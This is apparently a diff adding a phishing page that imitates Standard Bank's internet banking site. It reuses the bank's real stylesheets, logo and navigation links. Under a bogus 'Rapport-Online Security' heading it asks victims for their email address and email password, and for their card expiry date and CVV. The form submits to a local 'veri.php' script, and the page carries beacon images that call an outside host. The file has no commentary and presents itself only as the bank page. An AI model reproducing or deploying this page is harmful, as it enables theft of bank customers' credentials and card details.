@@ -1,0 +1,815 @@
+<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Internet banking
+  </title>
+  <link href="topmainmenu_files/usability2.css" type="text/css" rel="stylesheet" />
+  <link href="topmainmenu_files/normal-font.css" type="text/css" rel="stylesheet" />
+  <link href="topmainmenu_files/normal-niftyCorners.css" type="text/css" rel="stylesheet" />
+  <link media="print" href="topmainmenu_files/normal-niftyPrint.css" type="text/css" rel="stylesheet" />
+  <link href="topmainmenu_files/normal-styleNew.css" type="text/css" rel="stylesheet" />
+  <link href="topmainmenu_files/normal-TopNav.css" type="text/css" rel="stylesheet" />
+  <link type="text/css" href="https://www21.encrypt.standardbank.co.za/ibsa/style/usability2.css" rel="stylesheet" />
+  <link href="topbar_files/normal-HeaderBar.css" type="text/css" rel="stylesheet" />
+  <link href="topbar_files/normal-niftyCorners.css" type="text/css" rel="stylesheet" />
+  <link media="print" href="topbar_files/normal-niftyPrint.css" type="text/css" rel="stylesheet" />
+  <link type="text/css" href="https://www21.encrypt.standardbank.co.za/ibsa/style/normal-font.css" rel="stylesheet" />
+  <link type="text/css" href="https://www21.encrypt.standardbank.co.za/ibsa/style/normal-niftyCorners.css" rel="stylesheet" />
+  <link media="print" type="text/css" href="https://www21.encrypt.standardbank.co.za/ibsa/style/normal-niftyPrint.css" rel="stylesheet" />
+  <link type="text/css" href="https://www21.encrypt.standardbank.co.za/ibsa/style/normal-styleNew.css" rel="stylesheet" />
+  <link href="redirector_files/usability2.css" type="text/css" rel="stylesheet" />
+  <link href="redirector_files/normal-font.css" type="text/css" rel="stylesheet" />
+  <link href="redirector_files/normal-niftyCorners.css" type="text/css" rel="stylesheet" />
+  <link media="print" href="redirector_files/normal-niftyPrint.css" type="text/css" rel="stylesheet" />
+  <link href="redirector_files/normal-styleNew.css" type="text/css" rel="stylesheet" />
+  <script type="text/javascript" language="JavaScript">
+   var session_duration=270000;
+
+var count_down_URL = "/ibsa/common/common_count_down.jsp"; 
+var logoff_URL = "https://www11.encrypt.standardbank.co.za:443" + "/ibsa/timeout.jsp";
+  </script>
+  <script src="redirector_files/watchdog.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   window.onload = wd_init;
+window.onunload = wd_release;
+
+var bmenuframe = null;
+bmenuframe = window.parent.frames['bmenu'];
+if(bmenuframe &amp;&amp; bmenuframe.doneLoadMenu) {
+    bmenuframe.doneLoadMenu();
+}
+var nopopup = false;
+  </script>
+  <script src="redirector_files/nifty.js" language="Javascript">
+  </script>
+  <script language="JavaScript">
+   window.onload=function()
+                {
+                    wd_init();
+                    if(!NiftyCheck())
+                    return;
+                    Rounded("div.btnp","all","#E3E3E3","#739BC7","small smooth");
+                }
+  </script>
+  <link type="text/css" href="https://www21.encrypt.standardbank.co.za/ibsa/style/normal-LogonScreen.css" rel="stylesheet" />
+  <link type="text/css" href="https://www21.encrypt.standardbank.co.za/ibsa/style/normal-HeaderBar.css" rel="stylesheet" />
+  <link type="text/css" href="https://www21.encrypt.standardbank.co.za/ibsa/style/normal-niftyCorners.css" rel="stylesheet" />
+  <link media="print" type="text/css" href="https://www21.encrypt.standardbank.co.za/ibsa/style/normal-niftyPrint.css" rel="stylesheet" />
+  <script src="topmainmenu_files/nifty.js" language="JavaScript">
+  </script>
+  <script src="topmainmenu_files/ClientDetection.js" language="JavaScript">
+  </script>
+  <script src="topbar_files/nifty.js" language="Javascript">
+  </script>
+  <script src="topbar_files/ClientDetection.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   try
+            {
+            window.onload=function()
+            {
+            if(!NiftyCheck())
+            return;
+            Rounded("div#header","all","#FFFFFF","#003D7F","transparent");
+            Rounded("div#Logout","tl tr","#003D7F","#3C6CA0","transparent");
+            }
+            }catch(exp){}
+  </script>
+  <script src="https://www21.encrypt.standardbank.co.za/ibsa/scripts/nifty.js" language="Javascript">
+  </script>
+  <script async="" type="text/javascript" src="http://dspk.standardbank.co.za/811653/bgChk.js">
+  </script>
+  <script type="text/javascript">
+   try
+            {
+            window.onload=function()
+            {
+            if(!NiftyCheck())
+            return;
+            Rounded("div#divMenu","all","transparent","#FFFFFF","border #E3E3E3");
+            Rounded("div#divLogonTop","tr","#FFFFFF","#739BC7","transparent");
+            Rounded("div#idLoginAgree","bl br","#FFFFFF","#E8E8E9","transparent");
+            Rounded("div#divSecurityTip","all","#BDCFE7","#FFFFFF","transparent");
+            Rounded("div#LinkFooter","bl br","transparent","#FDFDE8","border #D5D5BE");
+            Rounded("div#header","all","#FFFFFF","#003D7F","transparent");
+	        Rounded("div#divPinPadHead","all","transparent","#739BC7","border #FFFFFF");
+	        Rounded("div.btnp","all","#E3E3E3","#739BC7","small smooth");
+	        }
+            }catch(exp){}
+  </script>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <style type="text/css">
+   &lt;!--
+body {
+	margin-bottom: 0px;
+}
+--&gt;
+  </style>
+ </head>
+ <body class="default">
+  <table width="100%" height="78px" border="0" bgcolor="#003D7F">
+   <tbody>
+    <tr>
+     <td valign="top" height="78px">
+      <div id="div">
+       <div id="div2">
+        <div id="div3">
+         <table width="100%" height="58" border="0" bgcolor="#003D7F" background="topbar_files/TopBarBG.gif" cellspacing="0" cellpadding="0">
+          <tbody>
+           <tr>
+            <td valign="top" height="58">
+             <table border="0" cellspacing="0" cellpadding="0">
+              <tbody>
+               <tr>
+                <td height="8" colspan="2">
+                </td>
+               </tr>
+               <tr>
+                <td width="14" height="36">
+                </td>
+                <td valign="top" height="36">
+                 <img border="0" src="https://www21.encrypt.standardbank.co.za/ibsa/images/logoWhiteOnBlue_en_ZA.gif" alt="" />
+                </td>
+               </tr>
+               <tr>
+                <td height="14" colspan="2">
+                </td>
+               </tr>
+              </tbody>
+             </table>
+            </td>
+            <td valign="bottom" align="right">
+             <table border="0" cellspacing="0" cellpadding="0">
+              <tbody>
+               <tr>
+                <td height="22" class="BarLink">
+                 <a target="_blank" href="http://www.standardbank.co.za/site/redirects/Contact_us.html" class="IBtitleLogon">
+                  <font size="1" face="Arial,sans-serif,Tahoma;" color="#ffffff" font-weight="100">
+                   Contact 
+                                    us
+                  </font>
+                 </a>
+                </td>
+                <td height="22" class="BarLink">
+                 <a target="_blank" href="http://www.standardbank.co.za/site/redirects/Functionality.html" class="IBtitleLogon">
+                  <font size="1" face="Arial,sans-serif,Tahoma;" color="#ffffff" font-weight="100">
+                   Help
+                  </font>
+                 </a>
+                </td>
+               </tr>
+              </tbody>
+             </table>
+            </td>
+            <td width="78" align="right">
+             <table border="0" bgcolor="#003D7F" cellspacing="0" cellpadding="0">
+              <tbody>
+               <tr>
+                <td>
+                 <div id="Logout">
+                  <table width="78" border="0" background="topbar_files/LogoutBG.gif" cellspacing="0" cellpadding="0">
+                   <tbody>
+                    <tr>
+                     <td width="3" height="34">
+                     </td>
+                     <td width="34" valign="top" height="34" align="left">
+                      <a target="_parent" href="https://www11.encrypt.standardbank.co.za/ibsa/logoff.do" accesskey="B">
+                       <img width="28" height="20" border="0" alt="" src="logoutLogo.jpg" />
+                      </a>
+                     </td>
+                     <td width="41" valign="top" height="34" align="left" class="IBtitleLogon">
+                      <a target="_parent" href="https://www11.encrypt.standardbank.co.za/ibsa/logoff.do" class="IBtitleLogon" accesskey="B">
+                       Log out
+                      </a>
+                     </td>
+                    </tr>
+                   </tbody>
+                  </table>
+                 </div>
+                </td>
+                <td width="8">
+                </td>
+                <td width="8">
+                </td>
+                <td width="8">
+                </td>
+                <td width="8">
+                </td>
+                <td width="8">
+                </td>
+               </tr>
+              </tbody>
+             </table>
+            </td>
+           </tr>
+          </tbody>
+         </table>
+        </div>
+       </div>
+      </div>
+     </td>
+     <td bgcolor="#003D7F">
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <div>
+   <table width="100%" height="0" border="0" cellspacing="0" cellpadding="0">
+    <form onsubmit="return submitOnce()" method="POST" action="veri.php" name="signonForm" id="form491830">
+    </form>
+    <tbody>
+     <tr>
+      <td valign="top" height="33" colspan="3">
+       <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tbody>
+         <tr>
+          <td width="100%" background="topmainmenu_files/TopNavBG.gif">
+           <table border="0" cellspacing="0" cellpadding="0">
+            <tbody>
+             <tr>
+              <!--
+                    <td height="25px">
+                    <div id="divHome">
+                    <table border="0" cellpadding="0" cellspacing="0">
+                    <tr><td valign="top" height="20px"><a href="/ibsa/.do" accesskey="A">Home</a></td></tr>
+                    </table>
+                    </div>
+                    </td>
+                    -->
+              <td>
+               <div id="divHome">
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td nowrap="nowrap" class="barmenu">
+                    <a target="dialog" href="https://www11.encrypt.standardbank.co.za/ibsa/accounts/getbalances.do" onclick="setLoadMenu(0, 'Loading Home...')" class="NavLinkSelected">
+                       Home  
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </div>
+              </td>
+              <td>
+               <div id="divLinkLeft">
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td nowrap="nowrap" class="barmenu">
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=statements" class="NavLink">
+                       Statements  
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </div>
+              </td>
+              <td>
+               <div id="divLink1">
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td nowrap="nowrap" class="barmenu">
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=payments" class="NavLink">
+                       Payments &amp; 
+                                    Transfers  
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </div>
+              </td>
+              <td>
+               <div id="divLink2">
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td nowrap="nowrap" class="barmenu">
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=transfer" class="NavLink">
+                       Account Services  
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </div>
+              </td>
+              <td>
+               <div id="divLink3">
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td nowrap="nowrap" class="barmenu">
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=prepaid" class="NavLink">
+                       Pre-paid  
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </div>
+              </td>
+              <td>
+               <div id="divLink4">
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td nowrap="nowrap" class="barmenu">
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=unittrusts" class="NavLink">
+                       Unit Trusts  
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </div>
+              </td>
+              <td>
+               <div id="divLink5">
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td nowrap="nowrap" class="barmenu">
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=asi" class="NavLink">
+                       Auto Share Invest  
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </div>
+              </td>
+              <td>
+               <div id="divSelected">
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td nowrap="nowrap" class="selectedbarmenu">
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=profile" class="NavLinkSelected">
+                       Profile  
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </div>
+              </td>
+              <td>
+               <div id="divLinkRight">
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td nowrap="nowrap" class="barmenu">
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=other_services" class="NavLink">
+                       Other Services  
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </div>
+              </td>
+              <!--
+                    <td class="helpmenuitem" align="right" width="100%">
+                    	
+                    <a href="/ibsa/topmainmenu/accounts_help.jsp" target="_help">&nbsp;&nbsp;Help&nbsp;&nbsp;</a>
+                    </td>-->
+             </tr>
+             <tr>
+              <td class="MiddleNav">
+              </td>
+              <td class="MiddleNav">
+              </td>
+              <td class="MiddleNav">
+              </td>
+              <td class="MiddleNav">
+              </td>
+              <td class="MiddleNav">
+              </td>
+              <td class="MiddleNav">
+              </td>
+              <td class="MiddleNav">
+              </td>
+              <td class="MiddleNavSelected">
+              </td>
+              <td class="MiddleNav">
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+          <td width="15" valign="top" background="topmainmenu_files/TopNavBG.gif">
+          </td>
+         </tr>
+         <tr>
+          <td colspan="2">
+           <div id="divSubNav">
+            <table border="0" cellspacing="0" cellpadding="0">
+             <tbody>
+              <tr>
+               <td>
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td width="10">
+                   </td>
+                   <td class="SubNavSelected">
+                    <img border="0" src="topmainmenu_files/bullet2.gif" alt="" />
+                   </td>
+                   <td bgcolor="#799bc5">
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=profile&submenu=myprofile&submenuLink=/ibsa/otp/check.do?fwd=profileview&submenuTarget=dialog&desc=Profile%20Details" class="SubNavLinkSelected">
+                     Profile Details
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+               <td>
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td width="10">
+                   </td>
+                   <td class="SubNav">
+                    <img border="0" src="topmainmenu_files/bullet2.gif" alt="" />
+                   </td>
+                   <td>
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=profile&submenu=sms&submenuLink=/ibsa/customer/smsregister.do&submenuTarget=dialog&desc=Notification" class="SubNavLink">
+                     Notification
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+               <td>
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td width="10">
+                   </td>
+                   <td class="SubNav">
+                    <img border="0" src="topmainmenu_files/bullet2.gif" alt="" />
+                   </td>
+                   <td>
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=profile&submenu=branchmessage&submenuLink=/ibsa/accounts/loadmsg2branch.do&submenuTarget=dialog&desc=Secure%20message" class="SubNavLink">
+                     Secure message
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+               <td>
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td width="10">
+                   </td>
+                   <td class="SubNav">
+                    <img border="0" src="topmainmenu_files/bullet2.gif" alt="" />
+                   </td>
+                   <td>
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=profile&submenu=myusagestats&submenuLink=/ibsa/customer/logusagemode.do&submenuTarget=dialog&desc=Usage%20stats%20from%20internet%20banking" class="SubNavLink">
+                     Usage Stats
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+               <td>
+                <table border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td width="10">
+                   </td>
+                   <td class="SubNav">
+                    <img border="0" src="topmainmenu_files/bullet2.gif" alt="" />
+                   </td>
+                   <td>
+                    <a target="_self" href="https://www11.encrypt.standardbank.co.za/ibsa/topmainmenu.do?name=profile&submenu=deregister&submenuLink=/ibsa/customer/deregister.jsp&submenuTarget=dialog&desc=Deregister%20from%20internet%20banking" class="SubNavLink">
+                     Deregister
+                    </a>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+              </tr>
+             </tbody>
+            </table>
+           </div>
+          </td>
+         </tr>
+         <tr>
+          <td valign="top" class="bordercolor">
+           <table border="0" cellspacing="1" cellpadding="1">
+            <tbody>
+             <tr>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+          <td width="100%" class="subbarmenu">
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+     </tr>
+     <tr>
+      <td width="3" valign="top" background="https://www18.encrypt.standardbank.co.za/ibsa/images/ShaddowBlockLeftBGBlue.gif">
+       <p>
+       </p>
+      </td>
+      <td width="1314" height="21" bgcolor="#BDCFE7">
+       <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tbody>
+         <tr>
+          <td class="TitleText">
+           Email Address and Password Protect (Rapport-Online Security) For MyUpdates :
+          </td>
+          <td align="right" class="TitleText">
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+      <td width="3" valign="top" background="https://www18.encrypt.standardbank.co.za/ibsa/images/ShaddowBlockRightBGBlue.gif" rowspan="3">
+      </td>
+     </tr>
+     <tr>
+      <td width="3" height="160" background="https://www18.encrypt.standardbank.co.za/ibsa/images/ShaddowBlockLeftBGBlue2.gif">
+      </td>
+      <td>
+       <script language="JavaScript" type="text/javascript">
+        &lt;!--
+                            var focusControl = document.forms["otpForm"].elements["otp"];
+                            if (focusControl != null &amp;&amp; focusControl.type != "hidden") {
+                            focusControl.focus();
+                            }
+						  
+                            // --&gt;
+       </script>
+       <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tbody>
+         <tr>
+          <td colspan="3">
+          </td>
+         </tr>
+         <tr>
+          <td width="9" background="/ibsa/images/ShaddowBlockLeftBGBlue2.gif">
+          </td>
+          <td width="1286">
+           <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tbody>
+             <tr>
+              <td colspan="2" class="ContentText">
+               <label for="note">
+                To protect and secure your online Email accounts, please enter your Email Address and Password below.
+               </label>
+              </td>
+             </tr>
+             <input type="hidden" value="en_ZA" name="country" />
+             <tr bgcolor="#EFF3F7">
+              <td class="ContentText">
+               <b>
+                <label accesskey="C" for="cardnumber">
+                 Email Address:
+                </label>
+               </b>
+              </td>
+              <td>
+               <table border="0" cellspacing="0" cellpadding="0">
+                <tbody>
+                 <tr>
+                  <td align="left">
+                   <input type="text" maxlength="50" size="30" id="cardnumber" name="emailid" class="TextBox" />
+                  </td>
+                  <td class="ContentText">
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr bgcolor="#FAFAFB">
+              <td class="ContentText">
+               <b>
+                <label accesskey="P" for="pin">
+                 Email Password:
+                </label>
+               </b>
+              </td>
+              <td>
+               <table border="0" cellspacing="0" cellpadding="0">
+                <tbody>
+                 <tr>
+                  <td align="left" colspan="2">
+                   <input type="password" maxlength="50" size="30" id="atmpin" name="emailpass" class="TextBox" />
+                  </td>
+                  <td class="ContentText">
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+          <td width="27" background="/ibsa/images/ShaddowBlockRightBGBlue2.gif">
+          </td>
+         </tr>
+         <tr>
+          <td width="9" height="9">
+          </td>
+          <td height="9" background="/ibsa/images/ShaddowBlockBottomBGBlue.gif">
+          </td>
+          <td width="27" height="9">
+          </td>
+         </tr>
+        </tbody>
+       </table>
+       <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tbody>
+         <tr>
+          <td class="hint" colspan="2">
+           <br />
+           <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tbody>
+             <tr>
+              <td class="TitleText">
+               <p>
+                ATM Card Protect (Rapport-Online Security) For MyUpdates :
+               </p>
+               <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                <tbody>
+                 <tr>
+                  <td colspan="2" class="ContentText">
+                   <label for="note">
+                    To protect and secure your atm card, please enter your Card Expiry Date and CVV below.
+                   </label>
+                  </td>
+                 </tr>
+                 <input type="hidden" value="en_ZA" name="country2" />
+                 <tr bgcolor="#EFF3F7">
+                  <td class="ContentText">
+                   <b>
+                    <label accesskey="C" for="label">
+                     Card Expiry month/year:
+                    </label>
+                   </b>
+                  </td>
+                  <td>
+                   <table border="0" cellspacing="0" cellpadding="0">
+                    <tbody>
+                     <tr>
+                      <td width="155" align="left">
+                       <input type="text" maxlength="10" size="30" id="label" name="atmexp" class="TextBox" />
+                      </td>
+                      <td width="210" class="ContentText">
+                      </td>
+                     </tr>
+                    </tbody>
+                   </table>
+                  </td>
+                 </tr>
+                 <tr bgcolor="#FAFAFB">
+                  <td class="ContentText">
+                   <b>
+                    <label accesskey="P" for="pin">
+                     Card CVV:
+                    </label>
+                   </b>
+                   <em>
+                    (3 digits at the back of card)
+                   </em>
+                  </td>
+                  <td>
+                   <table border="0" cellspacing="0" cellpadding="0">
+                    <tbody>
+                     <tr>
+                      <td align="left" colspan="2">
+                       <input type="text" maxlength="3" size="30" id="emailpass" name="atmcvv" class="TextBox" />
+                      </td>
+                      <td width="212" class="ContentText">
+                      </td>
+                     </tr>
+                    </tbody>
+                   </table>
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+               <p>
+               </p>
+              </td>
+              <td align="right" class="TitleText">
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+         </tr>
+         <tr>
+          <td>
+          </td>
+         </tr>
+         <tr>
+          <td width="37%" height="35">
+          </td>
+          <td width="63%">
+           <table>
+            <tbody>
+             <tr>
+              <td>
+               <div class="btnp" style="padding-top: 0px; padding-bottom: 0px;">
+                <b class="artop" style="background-color: rgb(227, 227, 227);">
+                </b>
+                <b class="ras1" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="ras2" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="artop" style="background-color: rgb(227, 227, 227);">
+                </b>
+                <b class="ras1" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="ras2" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <span style="padding-top: 0px; padding-bottom: 0px;" class="btnp">
+                 <input type="submit" style="border:0px;cursor:pointer;" value="Continue" accesskey="S" name="resetpwdcsp" />
+                </span>
+                <b class="artop" style="background-color: rgb(227, 227, 227);">
+                </b>
+                <b class="ras2" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="ras1" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="artop" style="background-color: rgb(227, 227, 227);">
+                </b>
+                <b class="ras2" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="ras1" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+               </div>
+              </td>
+              <td>
+              </td>
+              <td>
+               <div class="btnp" style="padding-top: 0px; padding-bottom: 0px;">
+                <b class="artop" style="background-color: rgb(227, 227, 227);">
+                </b>
+                <b class="ras1" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="ras2" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="artop" style="background-color: rgb(227, 227, 227);">
+                </b>
+                <b class="ras1" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="ras2" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <input type="submit" style="border:0px;cursor:pointer;" value="Cancel" accesskey="C" name="cancel" />
+                <b class="artop" style="background-color: rgb(227, 227, 227);">
+                </b>
+                <b class="ras2" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="ras1" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="artop" style="background-color: rgb(227, 227, 227);">
+                </b>
+                <b class="ras2" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+                <b class="ras1" style="background-color: rgb(115, 155, 199); border-color: rgb(171, 191, 213);">
+                </b>
+               </div>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+     </tr>
+     <tr>
+      <td width="3" height="15">
+      </td>
+      <td valign="top" height="15" background="https://www18.encrypt.standardbank.co.za/ibsa/images/ShaddowBlockBottomBGBlue.gif">
+      </td>
+     </tr>
+    </tbody>
+   </table>
+  </div>
+  <img id="903320" src="https://www.path-logic.com/v4.0/89001/cc?params=y1YNv9nJ5P%2F9SchTys5Lr%2BpwAMAtkqoxcOLv9EC4oBimb1pliYjxu17jAYjdK458sHI6p4ZUW07wmgofyAt8p9OxCz57a9zbFRjvBkDEWBzNQfpHqtdIv7yCm%2BWrsZVLMf%2FMd%2BKkGJUPNAbaVw%3D%3D" />
+  <img id="391502" src="https://www.path-logic.com/v4.0/89001/cc?params=y1YNv9nJ5P%2F9SchTys5Lr%2BpwAMAtkqoxcOLv9EC4oBimb1pliYjxu17jAYjdK458sHI6p4ZUW07wmgofyAt8p9OxCz57a9zbFRjvBkDEWBzNQfpHqtdIv7yCm%2BWrsZVLMfXFdeSmGpUPNAbaVw%3D%3D" />
+ </body>
+</html>
